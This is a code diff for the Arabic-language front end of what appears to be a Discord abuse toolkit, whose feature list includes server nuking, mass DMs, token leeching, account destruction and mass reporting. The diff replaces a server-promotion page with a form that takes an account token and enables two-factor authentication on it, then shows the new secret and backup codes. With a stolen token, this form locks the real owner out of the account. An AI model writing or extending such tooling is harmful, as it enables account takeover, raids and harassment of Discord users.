@@ -2,7 +2,7 @@
 
 import { useState, useEffect, useCallback, useRef } from 'react'
 
-type Section = 'verify' | 'nuker' | 'copy' | 'spam' | 'leveling' | 'sniper' | 'checker' | 'multi-spam' | 'mass-dm' | 'leaver' | 'react' | 'webhook-spam' | 'voice-online' | 'channel-clear' | 'token-generator' | 'webhook-creator' | 'server-backup' | 'locker' | 'avatar' | 'hypesquad' | 'disconnect' | 'token-info' | 'roles-manager' | 'token-ban' | 'token-save' | 'tool' | 'profile' | 'prime-nuker' | 'prime-raid' | 'account-destruction' | 'mass-report' | 'friend-spam' | 'token-leecher' | 'virus-scan' | 'server-promo' | 'tfa-notify' | 'server-protect'
+type Section = 'verify' | 'nuker' | 'copy' | 'spam' | 'leveling' | 'sniper' | 'checker' | 'multi-spam' | 'mass-dm' | 'leaver' | 'react' | 'webhook-spam' | 'voice-online' | 'channel-clear' | 'token-generator' | 'webhook-creator' | 'server-backup' | 'locker' | 'avatar' | 'hypesquad' | 'disconnect' | 'token-info' | 'roles-manager' | 'token-ban' | 'token-save' | 'tool' | 'profile' | 'prime-nuker' | 'prime-raid' | 'account-destruction' | 'mass-report' | 'friend-spam' | 'token-leecher' | 'virus-scan' | 'enable-2fa' | 'tfa-notify' | 'server-protect'
 
 interface Stats {
   deleted?: number; created?: number; spam_sent?: number; banned?: number; roles?: number
@@ -109,7 +109,7 @@ export default function Home() {
   const [primeMsg, setPrimeMsg] = useState('')
   const [primeToken, setPrimeToken] = useState('')
   const [primeCode, setPrimeCode] = useState('')
-  const [landingView, setLandingView] = useState<'landing' | 'app' | 'server-promo' | 'virus-scan' | 'twofa'>('landing')
+  const [landingView, setLandingView] = useState<'landing' | 'app' | 'enable-2fa' | 'virus-scan' | 'twofa'>('landing')
   const [showFeedbackModal, setShowFeedbackModal] = useState(false)
   const [feedbackType, setFeedbackType] = useState<'suggestion' | 'problem'>('suggestion')
   const [feedbackMessage, setFeedbackMessage] = useState('')
@@ -245,17 +245,9 @@ export default function Home() {
   const [vsScanStep, setVsScanStep] = useState('')
   const [vsScanMode] = useState<'trj'>('trj')
 
-  const [spServers, setSpServers] = useState<any[]>([])
-  const [spCategories, setSpCategories] = useState<{ id: string; name: string; icon: string }[]>([])
-  const [spCategory, setSpCategory] = useState('all')
-  const [spSort, setSpSort] = useState('members')
-  const [spLoading, setSpLoading] = useState(false)
-  const [spShowForm, setShowSpForm] = useState(false)
-  const [spFormInvite, setSpFormInvite] = useState('')
-  const [spSubmitting, setSpSubmitting] = useState(false)
-  const [spMsg, setSpMsg] = useState('')
-  const [spTotal, setSpTotal] = useState(0)
-  const [spRefreshing, setSpRefreshing] = useState(false)
+  const [e2faToken, setE2faToken] = useState('')
+  const [e2faLoading, setE2faLoading] = useState(false)
+  const [e2faResult, setE2faResult] = useState<any>(null)
 
   interface Saved2FAAccount { id: string; secret: string; label: string; issuer: string; addedAt: string }
   const [twoFaAccounts, setTwoFaAccounts] = useState<Saved2FAAccount[]>(() => { if (typeof window === 'undefined') return []; try { const s = localStorage.getItem('trj_2fa_accounts'); return s ? JSON.parse(s) : [] } catch { return [] } })
@@ -347,20 +339,7 @@ export default function Home() {
 
   // AI chat effects removed - moved to separate project
 
-  const fetchServerPromo = useCallback(async (cat?: string, sort?: string) => {
-    spLoading || setSpLoading(true)
-    try {
-      const params = new URLSearchParams()
-      if (cat) params.set('category', cat)
-      if (sort) params.set('sort', sort)
-      const res = await fetch(`/api/server-promo?${params}`)
-      const data = await res.json()
-      if (data.success) { setSpServers(data.servers); setSpCategories(data.categories); setSpTotal(data.total) }
-    } catch {}
-    setSpLoading(false)
-  }, [spLoading])
-
-  useEffect(() => { if (landingView === 'app') fetchServerPromo(spCategory, spSort) }, [landingView, spCategory, spSort])
+  // Server promo replaced with enable-2fa
 
   useEffect(() => { })
 
@@ -674,14 +653,14 @@ export default function Home() {
                 <div className="mt-3 text-[10px] text-emerald-400/50 bg-emerald-500/8 px-3 py-1 rounded-full border border-emerald-500/15 inline-block">34 ميزة</div>
               </div>
 
-              {/* Option 2: Server Promo */}
-              <div onClick={() => { setLandingView('server-promo'); fetchServerPromo('all', 'members') }} className="landing-card-cyber card-icon-bg-purple text-center group">
+              {/* Option 2: Enable 2FA */}
+              <div onClick={() => setLandingView('enable-2fa')} className="landing-card-cyber card-icon-bg-purple text-center group">
                 <div className="card-icon-bg card-icon-bg-purple">
-                  <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#8b5cf6" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>
+                  <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#8b5cf6" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                 </div>
-                <h2 className="text-base sm:text-lg font-black text-purple-400 mb-1">نشر سيرفرات</h2>
-                <p className="text-slate-400 text-[10px] sm:text-xs leading-relaxed hidden sm:block">انشر سيرفرك ووصل لأكبر عدد من الأعضاء</p>
-                <div className="mt-3 text-[10px] text-purple-400/50 bg-purple-500/8 px-3 py-1 rounded-full border border-purple-500/15 inline-block">سيرفرات</div>
+                <h2 className="text-base sm:text-lg font-black text-purple-400 mb-1">تفعيل 2FA</h2>
+                <p className="text-slate-400 text-[10px] sm:text-xs leading-relaxed hidden sm:block">تفعيل المصادقة الثنائية على حسابك</p>
+                <div className="mt-3 text-[10px] text-purple-400/50 bg-purple-500/8 px-3 py-1 rounded-full border border-purple-500/15 inline-block">حماية</div>
               </div>
 
               {/* Option 3: AI Chat - Maintenance */}
@@ -713,163 +692,107 @@ export default function Home() {
         </div>
       )}
 
-      {/* ===== SERVER PROMO - Discord Style ===== */}
-      {landingView === 'server-promo' && (
+      {/* ===== ENABLE 2FA ===== */}
+      {landingView === 'enable-2fa' && (
         <div className="min-h-screen relative z-10">
           <header className="header-modern sticky top-0 z-50 px-4 py-3">
-            <div className="max-w-5xl mx-auto flex items-center justify-between">
+            <div className="max-w-3xl mx-auto flex items-center justify-between">
               <button onClick={() => setLandingView('landing')} className="flex items-center gap-2 text-slate-400 hover:text-purple-400 transition-colors cursor-pointer">
                 <span className="text-lg">→</span>
                 <span className="text-sm font-medium">رجوع</span>
               </button>
               <div className="flex items-center gap-2">
-                <span className="text-lg">📢</span>
-                <span className="text-sm font-bold text-purple-400">نشر سيرفرات</span>
+                <span className="text-lg">🔐</span>
+                <span className="text-sm font-bold text-purple-400">تفعيل 2FA</span>
               </div>
-              <div className="flex items-center gap-2">
-                <button onClick={async () => { setSpRefreshing(true); try { await fetch('/api/server-promo', { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id: 'all', action: 'refresh' }) }); fetchServerPromo(spCategory, spSort) } catch {}; setTimeout(() => setSpRefreshing(false), 1000) }} className={`p-2 rounded-lg text-xs border transition-all cursor-pointer ${spRefreshing ? 'bg-purple-500/20 text-purple-400 border-purple-500/30 animate-spin' : 'bg-white/5 text-white/40 border-white/10 hover:bg-white/10'}`} title="تحديث الأعداد">🔄</button>
-                <button onClick={() => setShowSpForm(!spShowForm)} className="px-3 py-1.5 rounded-lg text-xs font-bold bg-purple-500/20 text-purple-400 border border-purple-500/30 hover:bg-purple-500/30 transition-all cursor-pointer">{spShowForm ? '✕' : '➕ نشر سيرفر'}</button>
-              </div>
+              <div className="w-16"></div>
             </div>
           </header>
-          <main className="max-w-5xl mx-auto px-4 py-6">
-
-            {/* Add Form - Simple invite link only */}
-            {spShowForm && (
-              <div className="glass-card rounded-2xl p-5 border border-purple-500/15 mb-6 animate-fade-in">
-                <div className="flex items-center gap-2 mb-4">
-                  <div className="w-8 h-8 rounded-lg bg-purple-500/20 flex items-center justify-center text-sm">📢</div>
-                  <div>
-                    <h3 className="text-sm font-bold text-purple-400">نشر سيرفرك</h3>
-                    <p className="text-[10px] text-slate-500">الصق رابط الدعوة وسيتم جلب البيانات تلقائياً</p>
-                  </div>
+          <main className="max-w-3xl mx-auto px-4 py-6">
+            <div className="glass-card card-hover rounded-2xl p-6 border border-purple-500/15 shadow-xl shadow-black/20">
+              <div className="flex items-center gap-3 mb-5">
+                <div className="w-10 h-10 rounded-xl bg-purple-500/20 flex items-center justify-center text-lg">🔐</div>
+                <div>
+                  <h2 className="text-base font-bold text-[#dbdee1]">تفعيل المصادقة الثنائية</h2>
+                  <p className="text-[11px] text-slate-500">أدخل التوكن وسيتم تفعيل 2FA تلقائياً</p>
                 </div>
-                <div className="flex gap-2">
-                  <div className="flex-1 relative">
-                    <input
-                      value={spFormInvite}
-                      onChange={e => setSpFormInvite(e.target.value)}
-                      onKeyDown={e => { if (e.key === 'Enter' && spFormInvite.trim()) { document.getElementById('sp-submit-btn')?.click() } }}
-                      placeholder="https://discord.gg/xxxxx"
-                      className="w-full bg-[#1e1f22] border border-[#40444b] rounded-xl px-4 py-3 text-white text-sm placeholder-[#6d6f78] focus:outline-none focus:border-[#5865f2] transition-all"
-                      dir="ltr"
-                    />
-                  </div>
-                  <button
-                    id="sp-submit-btn"
-                    onClick={async () => {
-                      if (!spFormInvite.trim()) { setSpMsg('❌ الرجاء إدخال رابط الدعوة'); return }
-                      if (!spFormInvite.includes('discord.gg') && !spFormInvite.includes('discord.com/invite')) { setSpMsg('❌ الرابط يجب أن يكون رابط ديسكورد'); return }
-                      setSpSubmitting(true); setSpMsg('')
-                      try {
-                        const res = await fetch('/api/server-promo', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ invite_url: spFormInvite.trim() }) })
-                        const data = await res.json()
-                        if (data.success) { setSpMsg('✅ تم النشر بنجاح!'); setSpFormInvite(''); setShowSpForm(false); if (data.servers) { setSpServers(data.servers); setSpTotal(data.servers.length) } else { setTimeout(() => fetchServerPromo(spCategory, spSort), 500) } }
-                        else setSpMsg('❌ ' + (data.error || 'فشل'))
-                      } catch { setSpMsg('❌ خطأ في الاتصال') }
-                      setSpSubmitting(false)
-                    }}
-                    disabled={spSubmitting}
-                    className="px-6 py-3 rounded-xl text-sm font-bold bg-[#5865f2] text-white hover:bg-[#4752c4] transition-all cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed whitespace-nowrap"
-                  >
-                    {spSubmitting ? (
-                      <span className="flex items-center gap-2"><svg className="animate-spin h-4 w-4" viewBox="0 0 24 24"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" /><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" /></svg> جارٍ...</span>
-                    ) : 'نشر السيرفر'}
-                  </button>
+              </div>
+              <div className="space-y-4">
+                <div>
+                  <label className="text-xs text-slate-400 mb-1.5 block">التوكن</label>
+                  <input
+                    type="password"
+                    value={e2faToken}
+                    onChange={e => setE2faToken(e.target.value)}
+                    placeholder="أدخل التوكن الخاص بالحساب"
+                    className="w-full bg-[#1e1f22] border border-[#40444b] rounded-xl px-4 py-3 text-white text-sm placeholder-[#6d6f78] focus:outline-none focus:border-purple-500 transition-all"
+                    dir="ltr"
+                  />
                 </div>
-                {spMsg && <div className={`mt-3 p-3 rounded-xl text-xs font-bold border text-center ${spMsg.startsWith('✅') ? 'bg-[#2d5a3d]/30 text-[#43b581] border-[#43b581]/30' : 'bg-[#5a2d2d]/30 text-[#f04747] border-[#f04747]/30'}`}>{spMsg}</div>}
+                <div className="p-3 rounded-xl bg-yellow-500/10 border border-yellow-500/20">
+                  <p className="text-[11px] text-yellow-400/80 leading-relaxed">
+                    ⚠️ <b>تنبيه:</b> تأكد من أن الحساب ليس عليه 2FA مفعّل مسبقاً. بعد التفعيل ستحتاج للـ Secret وكودات الاسترجاع للدخول مستقبلاً.
+                  </p>
+                </div>
+                <button
+                  onClick={async () => {
+                    if (!e2faToken.trim()) return
+                    setE2faLoading(true)
+                    setE2faResult(null)
+                    try {
+                      const res = await fetch('/api/enable-2fa', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ token: e2faToken.trim() })
+                      })
+                      const data = await res.json()
+                      setE2faResult(data)
+                    } catch {
+                      setE2faResult({ success: false, error: 'فشل الاتصال بالخادم' })
+                    }
+                    setE2faLoading(false)
+                  }}
+                  disabled={e2faLoading || !e2faToken.trim()}
+                  className="w-full py-3 rounded-xl text-sm font-bold bg-purple-600 text-white hover:bg-purple-700 transition-all cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
+                >
+                  {e2faLoading ? (
+                    <span className="flex items-center justify-center gap-2">
+                      <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" /><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" /></svg>
+                      جاري التفعيل...
+                    </span>
+                  ) : '🔐 تفعيل 2FA'}
+                </button>
               </div>
-            )}
 
-            {/* Categories & Sort */}
-            <div className="flex items-center justify-between flex-wrap gap-2 mb-5">
-              <div className="flex gap-1.5 overflow-x-auto pb-1 flex-1">
-                {spCategories.length > 0 ? spCategories.map((cat: any) => (
-                  <button key={cat.id} onClick={() => { setSpCategory(cat.id) }} className={`flex items-center gap-1 px-3 py-1.5 rounded-lg text-[11px] font-medium transition-all cursor-pointer border whitespace-nowrap ${spCategory === cat.id ? 'bg-[#5865f2]/20 text-[#dee0fc] border-[#5865f2]/30' : 'bg-[#2b2d31] text-[#b5bac1] border-[#3f4147] hover:bg-[#35373c] hover:text-[#dbdee1]'}`}>{cat.icon} {cat.name}</button>
-                )) : null}
-              </div>
-              <div className="flex gap-1">
-                <button onClick={() => setSpSort('recent')} className={`px-3 py-1.5 rounded-lg text-[11px] font-medium transition-all cursor-pointer border ${spSort === 'recent' ? 'bg-[#5865f2]/20 text-[#dee0fc] border-[#5865f2]/30' : 'bg-[#2b2d31] text-[#b5bac1] border-[#3f4147] hover:bg-[#35373c]'}`}>🕐 جديد</button>
-                <button onClick={() => setSpSort('members')} className={`px-3 py-1.5 rounded-lg text-[11px] font-medium transition-all cursor-pointer border ${spSort === 'members' ? 'bg-[#5865f2]/20 text-[#dee0fc] border-[#5865f2]/30' : 'bg-[#2b2d31] text-[#b5bac1] border-[#3f4147] hover:bg-[#35373c]'}`}>👥 أعضاء</button>
-                <button onClick={() => setSpSort('online')} className={`px-3 py-1.5 rounded-lg text-[11px] font-medium transition-all cursor-pointer border ${spSort === 'online' ? 'bg-[#5865f2]/20 text-[#dee0fc] border-[#5865f2]/30' : 'bg-[#2b2d31] text-[#b5bac1] border-[#3f4147] hover:bg-[#35373c]'}`}>🟢 أونلاين</button>
-              </div>
-            </div>
-
-            {/* Server Grid - Discord Discovery Style */}
-            {spLoading && spServers.length === 0 && <div className="text-center py-20"><div className="text-4xl animate-bounce mb-4">📡</div><p className="text-[#b5bac1] text-sm">جاري تحميل السيرفرات...</p></div>}
-            {!spLoading && spServers.length === 0 && (
-              <div className="text-center py-20">
-                <div className="text-5xl mb-4">📢</div>
-                <p className="text-[#dbdee1] text-base font-semibold mb-1">لا يوجد سيرفرات حالياً</p>
-                <p className="text-[#b5bac1] text-sm">كن أول من ينشر سيرفرك!</p>
-              </div>
-            )}
-            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
-              {spServers.map((srv: any) => (
-                <div key={srv.id} className="bg-[#2b2d31] rounded-xl overflow-hidden hover:bg-[#35373c] transition-all group border border-[#3f4147] hover:border-[#5865f2]/40 hover:shadow-[0_0_20px_rgba(88,101,242,0.1)]">
-                  {/* Banner */}
-                  {srv.banner_url ? (
-                    <div className="h-16 w-full bg-gradient-to-b from-[#4a4c4f] to-[#2b2d31] overflow-hidden">
-                      <img src={srv.banner_url} alt="" className="w-full h-full object-cover opacity-60" onError={e => { (e.target as HTMLImageElement).style.display = 'none' }} />
-                    </div>
-                  ) : (
-                    <div className="h-16 w-full bg-gradient-to-b from-[#4a4c4f] to-[#2b2d31]"></div>
-                  )}
-                  {/* Content */}
-                  <div className="px-4 pb-4 -mt-6 relative">
-                    {/* Server Icon */}
-                    <div className="mb-3">
-                      {srv.icon_url ? (
-                        <img
-                          src={srv.icon_url}
-                          alt={srv.name}
-                          className="w-[72px] h-[72px] rounded-full border-[4px] border-[#2b2d31] object-cover shadow-lg group-hover:border-[#35373c] transition-all"
-                          onError={e => { const el = e.target as HTMLImageElement; el.style.display = 'none'; el.nextElementSibling?.classList.remove('hidden') }}
-                        />
-                      ) : null}
-                      <div className={`w-[72px] h-[72px] rounded-full border-[4px] border-[#2b2d31] bg-[#5865f2] flex items-center justify-center text-2xl font-bold text-white shadow-lg group-hover:border-[#35373c] transition-all ${srv.icon_url ? 'hidden' : ''}`}>
-                        {srv.name ? srv.name.charAt(0).toUpperCase() : '?'}
+              {/* Result */}
+              {e2faResult && (
+                <div className={`mt-5 p-4 rounded-xl border ${e2faResult.success ? 'bg-emerald-500/10 border-emerald-500/20' : 'bg-red-500/10 border-red-500/20'}`}>
+                  {e2faResult.success ? (
+                    <>
+                      <p className="text-emerald-400 font-bold text-sm mb-3">✅ تم تفعيل 2FA بنجاح!</p>
+                      <div className="space-y-3">
+                        <div>
+                          <label className="text-[10px] text-slate-400 mb-1 block">🔑 Secret Key</label>
+                          <code className="block p-3 bg-black/30 rounded-lg text-sm text-emerald-300 break-all font-mono select-all" dir="ltr">{e2faResult.secret}</code>
+                        </div>
+                        {e2faResult.backup_codes && e2faResult.backup_codes.length > 0 && (
+                          <div>
+                            <label className="text-[10px] text-slate-400 mb-1 block">📦 كودات الاسترجاع ({e2faResult.backup_codes.length})</label>
+                            <div className="grid grid-cols-2 gap-1.5">
+                              {e2faResult.backup_codes.map((code: string, i: number) => (
+                                <code key={i} className="p-2 bg-black/30 rounded-lg text-[11px] text-yellow-300 font-mono text-center select-all" dir="ltr">{code}</code>
+                              ))}
+                            </div>
+                          </div>
+                        )}
+                        <p className="text-[10px] text-yellow-400/70 mt-2">⚠️ احفظ الـ Secret والكودات - لن تظهر مرة أخرى!</p>
                       </div>
-                    </div>
-                    {/* Server Name */}
-                    <h3 className="text-[15px] font-semibold text-[#dbdee1] truncate mb-1">{srv.name}</h3>
-                    {/* Member Count - Discord Style */}
-                    <div className="flex items-center gap-2 text-[12px] text-[#b5bac1] mb-3">
-                      <span className="flex items-center gap-1">
-                        <span className="w-2 h-2 rounded-full bg-[#23a559] inline-block flex-shrink-0"></span>
-                        <span>{(srv.online_count || 0).toLocaleString()} Online</span>
-                      </span>
-                      <span className="text-[#4e5058]">•</span>
-                      <span>{(srv.member_count || 0).toLocaleString()} Members</span>
-                    </div>
-                    {/* Description */}
-                    {srv.description && <p className="text-[12px] text-[#949ba4] line-clamp-2 mb-3 leading-relaxed min-h-[32px]">{srv.description}</p>}
-                    {!srv.description && <div className="mb-3 min-h-[32px]"></div>}
-                    {/* Actions */}
-                    <div className="flex gap-2">
-                      <a
-                        href={srv.invite_url}
-                        target="_blank"
-                        rel="noopener noreferrer"
-                        className="flex-1 py-2.5 rounded-lg text-[13px] font-semibold text-white bg-[#23a559] hover:bg-[#1a7d41] transition-all text-center"
-                      >
-                        انضم
-                      </a>
-                      <button
-                        onClick={async () => { try { await fetch('/api/server-promo', { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id: srv.id, action: 'bump' }) }); fetchServerPromo(spCategory, spSort) } catch {} }}
-                        className="px-3 py-2.5 rounded-lg text-[11px] font-medium bg-[#1e1f22] text-[#b5bac1] border border-[#3f4147] hover:bg-[#35373c] hover:text-[#dbdee1] transition-all cursor-pointer"
-                        title="رفع السيرفر"
-                      >
-                        ⬆️
-                      </button>
-                    </div>
-                  </div>
+                    </>
+                  ) : (
+                    <p className="text-red-400 font-bold text-sm">❌ {e2faResult.error}</p>
+                  )}
                 </div>
-              ))}
-            </div>
-
-            <div className="pt-8 mt-8 border-t border-[#3f4147] text-center">
-              <p className="text-[12px] text-[#6d6f78]">{spTotal} سيرفر</p>
+              )}
             </div>
           </main>
         </div>
